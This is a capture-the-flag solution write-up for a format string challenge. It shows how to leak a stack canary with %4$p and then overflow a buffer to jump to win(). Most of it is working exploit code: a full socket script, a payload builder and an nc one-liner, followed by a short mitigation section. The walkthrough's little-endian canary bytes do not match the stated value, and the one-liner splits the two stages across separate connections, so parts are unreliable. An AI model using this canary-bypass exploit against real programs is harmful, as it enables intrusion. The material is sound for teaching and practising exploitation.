# Challenge 25: FmtString — Solution

## Vulnerability Type
**Format String Vulnerability + Stack Canary Bypass (2-stage exploit)**

## Description
The challenge simulates a C program that calls `printf(user_input)` directly — the classic format string bug. The stack has a canary (random 8-byte value, low byte = `0x00`) that protects the return address. Exploitation requires two stages:

1. **Stage 1** — Use the format string to *leak* the canary value from the stack.
2. **Stage 2** — Craft a buffer overflow payload that preserves the leaked canary and overwrites the return address to `win()`.

## Vulnerable Code

```python
# chall.py — simulates printf(user_input)
fmt   = input("[fmt]> ").strip()
result = simulate_printf(fmt, stack)
print(f"[printf]: {result}")
```

The real-world C equivalent:

```c
char buf[32];
// ... later ...
printf(buf);       // VULNERABLE — user controls format string
```

## Stack Layout

```
Index (1-based for %N$p)   Content
─────────────────────────────────────────────
  %1$p   →   0x4141414141414141   (local var A)
  %2$p   →   0x00007fff5fbff260   (local var B / ptr)
  %3$p   →   0x0000000000000000   (local var C)
  %4$p   →   <CANARY>             ← this is what we need!
  %5$p   →   0x00007fff5fbff120   (saved RBP)
  %6$p   →   0x000000000040128a   (original return addr)
  %7$p   →   0x0000000000000001
  %8$p   →   0x0000000000000000
```

Canary note: low byte is always `0x00` (used to terminate C strings, making it harder to leak via `%s`).

## Exploitation Steps

### Stage 1 — Leak the Canary

Use a **positional format specifier** `%4$p` to read the 4th stack argument (the canary):

```
[fmt]> %4$p
[printf]: 0x1234567890abcd00
```

The leaked value is the canary. Note the low byte is always `00`.

### Stage 2 — Build the Overflow Payload

Stack layout during the vulnerable `strcpy()`:
```
offset 0x00 : [ buffer          32 bytes ]  ← 32× 0x41
offset 0x20 : [ stack canary     8 bytes ]  ← leaked canary (little-endian!)
offset 0x28 : [ saved RBP        8 bytes ]  ← anything (e.g. 0x4242424242424242)
offset 0x30 : [ return address   8 bytes ]  ← 0x401337 (WIN_ADDR) little-endian
```

**win() address:** `0x401337`  
**Little-endian:** `37 13 40 00 00 00 00 00`

```python
import struct

# Suppose leaked canary = 0x1234567890abcd00
canary = 0x1234567890abcd00

payload  = b"A" * 32                          # fill buffer
payload += struct.pack("<Q", canary)           # preserve canary exactly
payload += b"B" * 8                           # saved RBP (anything)
payload += struct.pack("<Q", 0x401337)        # return address = win()

print(payload.hex())
```

## Complete Exploit Script

```python
import socket
import struct
import re

HOST = "<host>"
PORT = 1337
WIN_ADDR = 0x401337

def recv_until(sock, marker):
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data

with socket.create_connection((HOST, PORT)) as s:
    banner = recv_until(s, b"[fmt]>")
    print(banner.decode())

    # ── STAGE 1: leak canary ──────────────────────────────────────
    s.sendall(b"%4$p\n")
    response = recv_until(s, b"[payload]>")
    print(response.decode())

    match = re.search(r"\[printf\]: (0x[0-9a-f]+)", response.decode())
    canary = int(match.group(1), 16)
    print(f"[+] Leaked canary: {hex(canary)}")

    # ── STAGE 2: overflow with correct canary ─────────────────────
    payload  = b"A" * 32                        # buffer
    payload += struct.pack("<Q", canary)         # canary (must match!)
    payload += b"B" * 8                          # saved RBP
    payload += struct.pack("<Q", WIN_ADDR)       # return address

    print(f"[*] Payload ({len(payload)}B): {payload.hex()}")
    s.sendall(payload.hex().encode() + b"\n")

    final = s.recv(4096).decode()
    print(final)

    flag = re.search(r"FCTF\{[^}]+\}", final)
    if flag:
        print(f"[+] Flag: {flag.group()}")
```

### One-liner test (manual)

```bash
# Stage 1: get canary
echo "%4\$p" | nc <host> 1337

# Stage 2: paste canary value, build payload
python3 -c "
import struct
canary  = 0x<CANARY_FROM_STAGE1>
payload = b'A'*32 + struct.pack('<Q', canary) + b'B'*8 + struct.pack('<Q', 0x401337)
print(payload.hex())
" | nc <host> 1337
```

## Walkthrough (Step by Step)

```
1. Connect → program prints win() address: 0x401337

2. Stage 1 input: %4$p
   Server: [printf]: 0x5e1a2b3c4d5e0000
   → canary = 0x5e1a2b3c4d5e0000

3. Stage 2 payload (hex):
   41414141414141414141414141414141  (16 bytes of 'A')
   41414141414141414141414141414141  (16 bytes of 'A')  → 32B buffer
   005e5e4d3c2b1a5e                  ← canary LE (0x5e1a2b3c4d5e0000)
   4242424242424242                  ← saved RBP (don't care)
   3713400000000000                  ← win() addr LE (0x401337)

4. Server:
   [+] Canary OK: 0x5e1a2b3c4d5e0000
   [i] Return address: 0x401337
   [!] Jumping to win()!
   [*] FLAG: FCTF{...}
```

## Why is There a Canary?

The canary is placed between the local buffer and the saved return address. On overflow, an attacker **must** overwrite the canary to reach the return address. If the canary value changes, the program detects the overflow and aborts.

```
Without format string bug: attacker cannot know canary → overflow detected
With format string bug:    attacker leaks canary → preserves it → bypasses protection
```

## Mitigation

```c
// 1. Always use the format argument
printf("%s", user_input);    // safe
printf(user_input);          // NEVER do this!

// 2. Enable stack canaries at compile time
// gcc -fstack-protector-strong -fstack-protector-all

// 3. Use _FORTIFY_SOURCE=2 for additional checks
// gcc -D_FORTIFY_SOURCE=2

// 4. Enable RELRO, PIE, NX
// gcc -Wl,-z,relro -Wl,-z,now -fpie -pie -fno-execstack
```

## Concepts Demonstrated

| Concept | Explanation |
|---|---|
| Format string bug | `printf(user_input)` lets user specify format, read arbitrary stack values |
| `%N$p` | Positional specifier — reads the N-th argument off the stack |
| Stack canary | Random value between buffer and return address, checked on return |
| Canary bypass | Leak via format string, then preserve it in overflow payload |
| Little-endian | Multi-byte values stored LSB first on x86-64 |

## References
- [Format String Exploitation Tutorial](https://axcheron.github.io/exploit-101-format-strings/)
- [pwntools documentation](https://docs.pwntools.com/)
- [Stack Canaries — How they work](https://ctf101.org/binary-exploitation/stack-canaries/)
- [PayloadsAllTheThings — Format String](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Format%20String%20Injection)
